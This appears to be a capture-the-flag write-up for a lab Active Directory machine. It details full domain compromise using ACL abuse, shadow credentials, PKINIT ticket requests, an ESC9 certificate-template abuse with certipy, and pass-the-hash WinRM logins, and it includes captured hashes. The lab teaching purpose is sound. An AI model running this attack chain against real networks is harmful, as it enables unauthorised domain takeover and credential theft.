
Difficulty: Medium

### Information Gathering

IP Address: 10.129.38.143
Username: judith.mader
Password: judith09

# User Flag
#### Service Enumeration

Enumeration of the services with NMAP.
```
sudo nmap 10.129.38.143
```

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-24 07:05 -0400
Nmap scan report for 10.129.38.143
Host is up (0.21s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

Enumeration of the services with more details.
```
sudo nmap 10.129.38.143 -sC -sV
```

```
netexec smb certified.htb -u 'judith.mader' -p 'judith09' --shares
```

```
SMB         10.129.38.143   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.38.143   445    DC01             [+] certified.htb\judith.mader:judith09
SMB         10.129.38.143   445    DC01             [*] Enumerated shares
SMB         10.129.38.143   445    DC01             Share           Permissions     Remark
SMB         10.129.38.143   445    DC01             -----           -----------     ------
SMB         10.129.38.143   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.38.143   445    DC01             C$                              Default share
SMB         10.129.38.143   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.38.143   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.38.143   445    DC01             SYSVOL          READ            Logon server share
```

Using RPCClient to enumerate a user list.
```
rpcclient 10.129.38.143 -U 'judith.mader%judith09'
```

```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[judith.mader] rid:[0x44f]
user:[management_svc] rid:[0x451]
user:[ca_operator] rid:[0x452]
user:[alexander.huges] rid:[0x641]
user:[harry.wilson] rid:[0x642]
user:[gregory.cameron] rid:[0x643]
```

![[Screenshot 2026-07-24 at 21.56.41.png]]

Through Bloodhound, it is possible to see that `judith.mader` has the `GenericWrite` privileges to the `Management` group.

```
impacket-owneredit -action write -new-owner 'judith.mader' -target 'Management' 'certified.htb'/'judith.mader':'judith09'
```

```
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'judith.mader' -target 'Management' 'CERTIFIED.HTB'/'judith.mader':'judith09'
```

```
net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "dc01.certified.htb"
```

Now, the `GenericAll` privilege to `management_svc` is exploited.
```
sudo ntpdate certified.htb
```

```
python pywhisker.py -d 'certified.htb' -u 'judith.mader' -p 'judith09' --target 'management_svc' --action 'add'
```

After exploitation, a TGT ticket can be obtained from the previous command result.
```
python gettgtpkinit.py -cert-pfx WKcGYmZk.pfx -pfx-pass "7j6UaPOtAe8xQe8jBO8l" -cert-pem WKcGYmZk_cert.pem -key-pem WKcGYmZk_priv.pem -dc-ip 10.129.38.143 "certified.htb"/"management_svc" management_svc.ccache
```

```
export KRB5CCNAME=management_svc.ccache
```

```
python getnthash.py -key 815c02713cfd97ae98962da61e9225e5b3bfbcd9ff28ddfb10bb3f5b7f249a23 certified.htb/management_svc
```

Now, the hash has been obtained successfully.
A WinRM Session is initiated.
```
evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

The user flag has been obtained.

![[Screenshot 2026-07-24 at 23.36.43.png]]

# Root Flag
#### Privilege Escalation

Again, a `GenericAll` privilege is exploited to the user `ca_operator`.
```
python pywhisker.py -d 'certified.htb' -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584' --target 'ca_operator' --action 'add'
```

```
export KRB5CCNAME=ca_operator.ccache
```

```
python gettgtpkinit.py -cert-pfx vqLSlZjL.pfx -pfx-pass "URex1vk5j5sz6PMLt79w" "certified.htb"/"ca_operator" ca_operator.ccache
```

```
python getnthash.py -key 9af63e3fda5dcedeb8df488c036fc65dfee91029d2335f575c175d76a9d30edc certified.htb/ca_operator
```

The credentials are confirmed to be valid.
```
netexec smb certified.htb -u 'ca_operator' -H 'b4b86f45c6018f1b664f70805f45d8f2'
```

The certificates of the system are checked if there is a vulnerable certificate.
```
certipy-ad find -u 'ca_operator@certified.htb' -hashes 'b4b86f45c6018f1b664f70805f45d8f2' -vulnerable -stdout
```

The system is vulnerable to the certificate `ESC9`.
```
certipy-ad account update -u 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn administrator -dc-ip 10.129.38.143
```

```
certipy-ad req -u 'ca_operator@certified.htb' -hashes 'b4b86f45c6018f1b664f70805f45d8f2' -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.38.143
```

```
certipy-ad account update -u 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.38.143
```

```
certipy-ad auth -pfx administrator.pfx -domain 'certified.htb' -dc-ip 10.129.38.143
```

A hash has been obtained successfully from the `administrator` user.

```
evil-winrm -i certified.htb -u administrator -H '0d5b49608bbce1751f708748f67e2d34'
```

The root flag has been obtained.
![[Screenshot 2026-07-25 at 00.52.27.png]]